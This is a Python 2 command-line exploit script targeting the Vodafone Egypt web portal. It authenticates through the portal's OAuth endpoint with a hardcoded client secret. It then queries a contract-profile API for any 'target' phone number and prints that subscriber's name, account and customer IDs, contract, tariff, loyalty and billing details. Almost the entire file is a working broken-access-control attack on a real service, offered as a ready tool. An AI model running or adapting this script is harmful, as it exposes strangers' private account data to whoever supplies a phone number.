#!/usr/bin/env python
# -- coding: UTF-8 --


'''
 __    __             _        ,__                       _     _
 |     |    __.    ___/   ___  /  `   __.  , __     ___  `.   / 
  \    /  .'   \  /   |  /   ` |__  .'   \ |'  `. .'   `   \,'  
   \  /   |    | ,'   | |    | |    |    | |    | |----'  ,'\   
    \/     `._.' `___,' `.__/| |     `._.' /    | `.___, /   \  
                      `        /                                

Author: Deyaa Muhammad
Twitter: @deyaamuhammad
'''


import os
import sys
import json
import logging
from logging import config 
import requests
import argparse

try:
    # Fix UTF8 output issues on Windows console.
    from win_unicode_console import enable
    enable()
except ImportError:
    pass

PORTAL_CONFIG = {
    "username": "01033700000",
    "password": "00000000000"
}

LOG_CONFIG = {
    'version':1,
    'formatters':{
        'error':{
            'format': "%(levelname)s at %(asctime)s in %(funcName)s in %(filename) at line %(lineno)d: %(message)s",
            'datefmt': '%Y-%m-%d %H:%M:%S'
        },
        'debug':{
            'format': "[%(asctime)s]: %(message)s",
            'datefmt': '%Y-%m-%d %H:%M:%S'
        },
        'info':{
            'format': "%(message)s",
            'datefmt': '%Y-%m-%d %H:%M:%S'
            }
    },
    'handlers':{
        'console':{
            'class':'logging.StreamHandler',
            'formatter':'info',
            'level':logging.INFO
        },
        # 'file':{
        #     'class':'logging.FileHandler',
        #     'filename':'.log',
        #     'formatter':'debug',
        #     'level':logging.INFO
        # }
    },
    'root':{
        # 'handlers':['console','file'],
        'handlers':['console'],
        'level':'INFO'
    }
}

class Exploit(object):

    """docstring for Exploit."""
    def __init__(self, args):

        self.response = None
        self.json = None
        self.token = None
        self.msisdn = None

        if args.msisdn:
            self.msisdn = args.msisdn

        if args.username:
            self.username = args.username

        if args.password:
            self.password = args.password

        self.oauth()
        self.run()
        self.results()



    def results(self):

        logging.info('Results.')


        # print(self.json)
        
        try:

            # print json.dumps( self.json, sort_keys=True, indent=4 )

            print "\r"

            # for k, v in self.json.iteritems():
            #     print "%s: %s\r" %(k ,v)

            # print "\r"
            print "First Name: %s\r" % self.json['firstName'].encode('utf-8')
            print "Last Name: %s\r" % self.json['lastName'].encode('utf-8')
            print "Contract Type: %s\r" % self.json['contractType']
            print "Line Type: %s\r" % self.json['lineType']
            print "Service Class: %s\r" % self.json['serviceClassName']
            print "Tariff Model: %s\r" % self.json['tariffModelName']
            print "Segment: %s\r" % self.json['segmentValue']
            
            print "MSISDN: %s\r" % self.msisdn
            print "Account Number: %s\r" % self.json['accountNumber']
            print "Installment Device: %s\r" % self.json['installmentDevice']
            print "Contract ID: %s\r" % self.json['contractID']
            print "customer ID: %s\r" % self.json['customerID']
            print "Loyalty Amount: %s\r" % self.json['loyaltyAmount']
            print "Loyalty Points: %s\r" % self.json['loyaltyPoints']
            print "Loyalty Flag: %s\r" % self.json['loyaltyFlag']
            print "Bill Cycle Date: %s\r" % self.json['billCycleDate']

        except:
            logging.error("This MSISDN %s is not registered." %self.msisdn )
            exit()


    def run(self):

        try:

            logging.info('Sending payload using target MSISDN %s.' % self.msisdn )
 
            url = "https://web.vodafone.com.eg/services/getAggregatesContractProfile/%s" % self.msisdn

            headers = {
                "Host": "web.vodafone.com.eg",
                "msisdn": self.username,
                "api-host": "RegistrationHost",
                "access-token": self.token,
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-type": "text/plain; charset=utf-8",
                "Connection": "close",
            }

            r = requests.get(url, headers= headers)

            self.response = r

            self.json = r.json()

            logging.info('Payload sent.')

            return self.response


        except:
            logging.error("There was a problem processing exploit for %s" %self.msisdn )
            exit()


    def oauth(self):

        try:

            logging.info('Trying to authenticate %s.' % self.username )

            url = "http://web.vodafone.com.eg/services/security/oauth/oauth/token"

            data = {
                "username": self.username,
                "password": self.password,
                "grant_type": "password",
                "client_id": "my-trusted-client",
                "client_secret": "secret",
            }

            headers = {
                "Host": "web.vodafone.com.eg",
                "Accept": "application/json",
                "Origin": "http://web.vodafone.com.eg",
                "api-host": "token",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "http://web.vodafone.com.eg/ar/usbmanagement?inpredir=y",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
            }

            r = requests.post(url, data=data, headers= headers)

            self.token = r.json()['access_token']

            logging.info('Authenticated successfully.')
            logging.info('access-token: %s.' %self.token)

        except:
            logging.error("There was a problem processing authentication request.")
            exit()


class CLI(object):
    """docstring for CLI."""
    def __init__(self):
        self.logging()
        self.main()

    def banner(self):
        print __doc__


    def logging(self):
        logging.config.dictConfig(LOG_CONFIG)


    def main(self):

        # Set formatter setting s to remove spaces
        os.environ['COLUMNS'] = "120"
        formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=52)
        parser = argparse.ArgumentParser(formatter_class=formatter)

        # Set args with Default values.
        parser.add_argument("-m","--msisdn",action="store",dest="msisdn",help="Target Phone Number.")
        parser.add_argument("-u","--username",action="store",dest="username",default=PORTAL_CONFIG['username'],help="Vodafone Portal Username default is %s." %PORTAL_CONFIG['username'])
        parser.add_argument("-p","--password",action="store",dest="password",default=PORTAL_CONFIG['password'],help="Vodafone Portal Password default is %s." %PORTAL_CONFIG['password'])
        # parser.add_argument("-l","--log",action="store",dest="log",help="Logging to file")

        args = parser.parse_args()

        # Recognize args
        if len(sys.argv) == 1:
            self.banner()
            parser.parse_args(['--help'])

        # Call Exploit
        if args.msisdn:
            Exploit(args = args)


if __name__ == "__main__":
    CLI()
